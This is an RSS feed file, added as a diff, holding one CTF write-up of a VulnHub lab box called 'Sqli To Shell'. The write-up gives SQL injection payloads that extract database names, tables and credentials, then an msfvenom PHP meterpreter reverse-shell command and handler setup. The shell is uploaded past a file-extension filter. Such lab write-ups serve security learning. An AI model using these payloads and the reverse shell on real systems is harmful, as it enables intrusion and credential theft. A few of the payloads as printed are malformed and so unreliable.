@@ -1,0 +1,172 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>LoneWolf4713&#39;s CTF Writeups</title>
+    <link>https://lonewolf4713.github.io/ctfs/</link>
+    <description>Recent content on LoneWolf4713&#39;s CTF Writeups</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>LoneWolf4713</copyright>
+    <lastBuildDate>Fri, 02 Jul 2021 09:52:27 +0530</lastBuildDate><atom:link href="https://lonewolf4713.github.io/ctfs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Sqli_to_shell</title>
+      <link>https://lonewolf4713.github.io/ctfs/posts/sqli-to-shell-walkthrough/</link>
+      <pubDate>Fri, 02 Jul 2021 09:52:27 +0530</pubDate>
+      
+      <guid>https://lonewolf4713.github.io/ctfs/posts/sqli-to-shell-walkthrough/</guid>
+      <description>Hello Hackers , Today we will be solving Sqli To Shell. The Box Seems Easy , But Never Underestimate your opponents !
+Goal - Find An Sql Injection Vuln and Then exploit it to get a Shell .
+Step 1: Reconnaissance ! Let&amp;rsquo;s browse the website for time with our browser We Find Two Points Of Interest
+  An Admin Login Page   Parameter &amp;ldquo;ID&amp;rdquo; is Passed To cat.</description>
+      <content>&lt;p&gt;Hello Hackers , Today we will be solving &lt;a href=&#34;www.vulnhub.com&#34;&gt;Sqli To Shell&lt;/a&gt;.
+The Box Seems Easy , But Never Underestimate your opponents !&lt;/p&gt;
+&lt;p&gt;Goal - Find An Sql Injection Vuln and Then exploit it to get a Shell .&lt;/p&gt;
+&lt;h1 id=&#34;step-1-reconnaissance-&#34;&gt;Step 1: Reconnaissance !&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s browse the website for time with our browser
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/1.png&#34; alt=&#34;admin-login&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We Find Two Points Of Interest&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;An Admin Login Page
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/3.png&#34; alt=&#34;admin-login&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Parameter &amp;ldquo;ID&amp;rdquo; is Passed To &lt;!-- raw HTML omitted --&gt;cat.php&lt;!-- raw HTML omitted --&gt; Using GET Method !
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/2.png&#34; alt=&#34;parameters&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;step-2-probing-&#34;&gt;Step 2: Probing !&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s Try To Probe The &lt;!-- raw HTML omitted --&gt;cat.php&lt;!-- raw HTML omitted --&gt; To Find any vulns.
+We Will Try By replacing &amp;ldquo;ID&amp;rdquo; param. with a single quote ( &#39; )  in URL&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/4.png&#34; alt=&#34;single-quote&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;yes--the-application-crashed-and-returned-an-mysql-error&#34;&gt;Yes ! The Application Crashed and returned an MySQL error&lt;/h4&gt;
+&lt;p&gt;Which means , our Input Dictates the behaviour Of App.
+Therefore , It Is Vulnerable To &lt;!-- raw HTML omitted --&gt; SQL INJECTION ! &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;h1 id=&#34;step-3-exploitation-&#34;&gt;Step 3: Exploitation !&lt;/h1&gt;
+&lt;p&gt;Let Us Try , &lt;!-- raw HTML omitted --&gt;id=1&#39;&lt;!-- raw HTML omitted --&gt; In URL parameter.
+&lt;code&gt;..id=1&#39;&lt;/code&gt;
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/6.png&#34; alt=&#34;single-quote-in-url&#34;&gt;
+It shows an error .&lt;/p&gt;
+&lt;p&gt;lets us try putting directly an OR statement &lt;code&gt;..id=1 or 1=1--&lt;/code&gt;
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/y7.png&#34; alt=&#34;or-statement&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;it-worked--the-webpage-returns-all-items&#34;&gt;IT WORKED ! The Webpage returns all items.&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;..id=1 OR 1=1-- Explanation -&lt;/code&gt;
+Here , OR Statement tells app that it will have to either have to return items  with id matching 1 or 1=1 ,
+Since 1=1 is always true , the app returns all items . Yeah , that took a while to understand.&lt;/p&gt;
+&lt;h1 id=&#34;step-4-post-exploitation---taking-down-goals--&#34;&gt;Step 4: Post Exploitation ! ( Taking Down Goals ! )&lt;/h1&gt;
+&lt;h3 id=&#34;finding-column-and-number-of-columns&#34;&gt;Finding Column and Number Of Columns&lt;/h3&gt;
+&lt;p&gt;Now , we&amp;rsquo;re going to extract information from a database , and for that we&amp;rsquo;re going to use
+&lt;strong&gt;UNION CLAUSE&lt;/strong&gt; In SQL.
+UNION clause helps in binding two sql queries together. on condition that they have same number of columns.
+It&amp;rsquo;s like it will append the two queries&#39; results  together in same amount of columns.
+If two queries have different columns , It will throw a error right at your you.&lt;/p&gt;
+&lt;p&gt;So To Guess how many columns our default query running on server has , we will use
+&lt;strong&gt;NULL COLUMN DATATYPE&lt;/strong&gt; ,A column datatype that can take any other columns datatype , or atleast be
+compatible with them. and results in no data what so ever.&lt;/p&gt;
+&lt;p&gt;Since , We See That two things are displayed when we enter 1 or any other number in ID PARAMETER.
+that is the - Title and PHOTO. Hence , lets try two null columns to match the no of columns with the query.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Enter In URL -&lt;/strong&gt;
+&lt;code&gt;http://192.168.118.133/cat.php?id=1 UNION SELECT null,null &lt;/code&gt;
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/8.png&#34; alt=&#34;NOT same number of columns&#34;&gt;
+Oops , it throws an error saying two queries have different number of columns.
+Lets try again with 3 columns and again with 4 null columns , each seperated by a &amp;ldquo;,&amp;rdquo; comma.&lt;/p&gt;
+&lt;p&gt;3 null columns doesn&amp;rsquo;t work , but at 4 null columns, We get a clear Success !
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/9.png&#34; alt=&#34;4-null-columns&#34;&gt;&lt;/p&gt;
+&lt;p&gt;here, we see that in addition to a &amp;ldquo;photo-title pair&amp;rdquo; , we get a null title and picture.
+so let&amp;rsquo;s see which columns in the query are being put in &amp;ldquo;photo-title-pair&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Put 123 in place of 1st NULL Column&lt;/strong&gt;.&lt;br&gt;
+&lt;strong&gt;Put&amp;rsquo;abc&#39; in place of 2nd NULL Column&lt;/strong&gt;.&lt;br&gt;
+&lt;strong&gt;Put &amp;lsquo;pqrs&amp;rsquo; in place of 3rd NULL Column&lt;/strong&gt;.&lt;br&gt;
+&lt;strong&gt;Put &amp;lsquo;xyz&amp;rsquo; in place of 4th NULL Column.&lt;/strong&gt;&lt;br&gt;
+&lt;code&gt;...id=1 UNION 123,&#39;abc&#39;,&#39;pqrs&#39;,&#39;xyz&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/10.png&#34; alt=&#34;column-found&#34;&gt;
+Hence , the Second Column Is being displayed in the page.&lt;/p&gt;
+&lt;h3 id=&#34;getting-information-to-target&#34;&gt;Getting Information To Target.&lt;/h3&gt;
+&lt;p&gt;Now , We need 3 parameters to get our username/passwd. they are -&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Database Name&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Table Name&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Column Name&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;1-getting-database-name--&#34;&gt;1. Getting Database Name -&lt;/h4&gt;
+&lt;p&gt;In Our URL , replace &amp;lsquo;abc&amp;rsquo; with database()
+` &amp;hellip; id=1 UNION 123,database(),&amp;lsquo;pqrs&amp;rsquo;,&amp;lsquo;xyz&amp;rsquo;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/11.png&#34; alt=&#34;database-name-returned&#34;&gt;
+Now We Have The Database Name , as MySQL database() function returns database name .&lt;/p&gt;
+&lt;h4 id=&#34;2--getting-table-name--&#34;&gt;2.  Getting Table Name -&lt;/h4&gt;
+&lt;p&gt;Every Database Has A &amp;lsquo;Metadata Table&amp;rsquo; , which keeps record of all the tables/columns
+in a database.In MySQL , it is &amp;lsquo;Information_Schema&amp;rsquo; and has many tables,including
+one named &lt;strong&gt;tables&lt;/strong&gt; and one named &lt;strong&gt;columns&lt;/strong&gt;.
+Looks Like A Perfect Spot to get our Table Name And Column Name !&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Enter In URL -&lt;/strong&gt; &lt;br&gt;
+&lt;code&gt;.. id=1 UNION SELECT 123,table_name,&#39;pqrs&#39;,&#39;xyz&#39; from information_schema.tables&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Here,we have used SQL DOT NOTATION , to query another database table .
+Its like , &amp;ldquo;DATABASE_NAME.TABLE_NAME&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/12.png&#34; alt=&#34;got-all-tablename&#34;&gt;
+As You can see, that the page returns all tablename, including a &lt;strong&gt;USERS&lt;/strong&gt; tablename at the very bottom !&lt;/p&gt;
+&lt;p&gt;Hence , We Will Target The &lt;strong&gt;USERS&lt;/strong&gt; table in &lt;strong&gt;PHOTOBLOG&lt;/strong&gt; Database.&lt;/p&gt;
+&lt;h4 id=&#34;3-getting-column-names-&#34;&gt;3. Getting Column Names-&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;In URL , Make Changes !&lt;/strong&gt; &lt;br&gt;
+&lt;code&gt;...id=1 UNION SELECT 123,column_name,&#39;pqrs&#39;,&#39;xyz&#39; FROM information_schema.columns WHERE table_name=&#39;users&#39; &lt;/code&gt;&lt;br&gt;
+Now ,We say - Give me &lt;strong&gt;column_name&lt;/strong&gt; from &lt;strong&gt;colummns&lt;/strong&gt; table in &lt;strong&gt;information_schema&lt;/strong&gt; database where &lt;strong&gt;table_name&lt;/strong&gt; is &lt;strong&gt;users&lt;/strong&gt; .&lt;br&gt;
+Hence , It Will Return Column Names only from Table Users.
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/13.png&#34; alt=&#34;got-column-names&#34;&gt;
+As You Can See , We Got The Columns !&lt;/p&gt;
+&lt;h4 id=&#34;extracting-credenials-&#34;&gt;Extracting Credenials !&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Enter In URL -&lt;/strong&gt; &lt;br&gt;
+&lt;code&gt;..id=1 UNION 123,concat(login,&amp;quot;@&amp;quot;,password),null,null FROM photoblog.users &lt;/code&gt; &lt;br&gt;
+Here ,&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Concat()&lt;/strong&gt; is a MySQL function used to join many strings together , And we are using it to join our &amp;lsquo;login and password&amp;rsquo; column together.Since we have only one column from result being displayed.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Login and Password&lt;/strong&gt; are our two columns.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Photoblog.Users&lt;/strong&gt; is our Database and Table_Name in DOT Notation.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/14.png&#34; alt=&#34;password-found&#34;&gt;
+We atlast got the Creds. Great Work !&lt;/p&gt;
+&lt;h5 id=&#34;but-the-passwd-is-encrypted-using-md5-algorithm-hence-we-need-to-decrypt-it&#34;&gt;But The Passwd is Encrypted (Using MD5 Algorithm ),Hence we need to Decrypt it.&lt;/h5&gt;
+&lt;p&gt;Head over to &lt;a href=&#34;https://hashes.com/en/tools/hash_identifier&#34;&gt;This Site&lt;/a&gt; To Decrypt Hash.
+and Then try to login.&lt;br&gt;
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/15.png&#34; alt=&#34;logged-in&#34;&gt;
+&lt;code&gt;And There We Go ! We Got Logged In !&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;getting-the-shell-&#34;&gt;Getting The Shell !&lt;/h4&gt;
+&lt;p&gt;Now , All we have to do is get our Shell.
+Since the Main Extension of these webpages is &lt;strong&gt;.php&lt;/strong&gt; ,We will make a PHP reverse shell meterpreter payload.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Let&amp;rsquo;s Generate PHP Reverse Shell using MSFVENOM&lt;/strong&gt; &lt;br&gt;
+&lt;code&gt;msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.118.128 LPORT=4747 -f raw -o not-a-virus.php &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Explanation-&lt;/em&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;&amp;quot;-p&amp;quot; parameter stands for payload type.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&amp;ldquo;LHOST&amp;rdquo; your machine IP ,(Our IP)&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&amp;ldquo;LPORT&amp;rdquo; &amp;ldquo;Local Port&amp;rdquo; will be the port on our side which will stay open to catch connections.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&amp;quot;-f&amp;quot; format=raw , since we want raw php code to execute on the web-server.&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&amp;quot;-o&amp;quot; output file name.&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h6 id=&#34;start-msfconsole-and-set-options--&#34;&gt;Start msfconsole and set options -&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;msfconsole&lt;/code&gt;  &lt;br&gt;
+&lt;code&gt;use multi/handler&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;set payload php/meterpreter/reverse_tcp&lt;/code&gt;  &lt;br&gt;
+&lt;code&gt;set LHOST 192.168.118.128&lt;/code&gt;             &lt;br&gt;
+&lt;code&gt;set LPORT 4747&lt;/code&gt;          &lt;br&gt;
+&lt;code&gt;run&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Since The Purpose of a &amp;ldquo;Reverse-Shell&amp;rdquo; is to connect back to attacker. This will handle the connection our payload will make to us.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/16.png&#34; alt=&#34;msfconsole-setup&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now,We Have To Upload Our Shell To Server to execute it. Let&amp;rsquo;s Try The &lt;strong&gt;&amp;ldquo;New Picture&amp;rdquo;&lt;/strong&gt; Link besides Logout Option in Admin Panel.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/17.png&#34; alt=&#34;upload-shell-fake&#34;&gt;      &lt;br&gt;
+Oh, Admin has disabled &amp;ldquo;.php&amp;rdquo; files and we get an error -
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/18.png&#34; alt=&#34;upload-shell-error&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To Bypass This Limitation,Let&amp;rsquo;s try renaming our file as &lt;strong&gt;&amp;ldquo;not-a-virus.PHP&amp;rdquo;&lt;/strong&gt; and uploading it.
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/19.png&#34; alt=&#34;upload-shell-success&#34;&gt;   &lt;br&gt;
+We Successfully bypassed the File Extension Limit.The admin didn&amp;rsquo;t even bother to effectively enforce the Limit !&lt;/p&gt;
+&lt;h2 id=&#34;last-step--click-on-the-link-definitely-not-a-virus-to-run-our-code&#34;&gt;Last Step , Click on the link &amp;ldquo;definitely-not-a-virus&amp;rdquo; to run our code.&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/20.png&#34; alt=&#34;clicked&#34;&gt;
+&lt;img src=&#34;https://lonewolf4713.github.io/ctfs/images/21.png&#34; alt=&#34;shell&#34;&gt;
+AND So we got the Meterpreter Shell. Another day , another shell !&lt;/p&gt;
+&lt;h1 id=&#34;box-owned-&#34;&gt;Box Owned !&lt;/h1&gt;
+&lt;p&gt;&lt;code&gt;You might be thinking why requesting a php file in my browser makes it run on the web-server?&lt;/code&gt;   &lt;br&gt;
+&lt;code&gt;This is because PHP stands for &amp;quot;Hyper-Text PreProcesser&amp;quot;,It&#39;s job is to pre-process the HTML,(In order to dynamically generate HTML) before sending it to browser. Hence,before sending the HTML page to us,the page is &amp;quot;processed&amp;quot; and our malicious code gets executed to the server !&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Thank You !&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
